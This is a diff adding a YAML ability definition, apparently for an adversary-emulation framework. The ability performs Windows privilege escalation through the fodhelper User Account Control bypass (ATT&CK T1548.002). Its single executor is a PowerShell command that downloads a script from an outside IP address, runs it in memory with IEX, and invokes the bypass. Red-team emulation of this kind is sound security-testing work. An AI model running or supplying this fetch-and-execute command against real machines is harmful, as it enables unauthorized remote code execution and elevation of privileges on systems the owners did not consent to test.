@@ -1,0 +1,31 @@
+- tactic: privilege-escalation
+  technique_name: 'Abuse Elevation Control Mechanism: Bypass User Account Control'
+  technique_id: T1548.002
+  name: privilege escalation using fodhelper bypass
+  description: ''
+  executors:
+  - name: psh
+    platform: windows
+    command: powershell -Command "IEX (iwr -useb 'http://198.18.128.193/fodhelper.ps1');
+      FodhelperBypass"
+    code: null
+    language: null
+    build_target: null
+    payloads: []
+    uploads: []
+    timeout: 60
+    parsers: []
+    cleanup: []
+    variations: []
+    additional_info: {}
+  requirements: []
+  privilege: ''
+  repeatable: false
+  buckets:
+  - privilege-escalation
+  additional_info: {}
+  access: {}
+  singleton: false
+  plugin: ''
+  delete_payload: true
+  id: 9420466b-9fef-4945-bca7-0598ac25909b
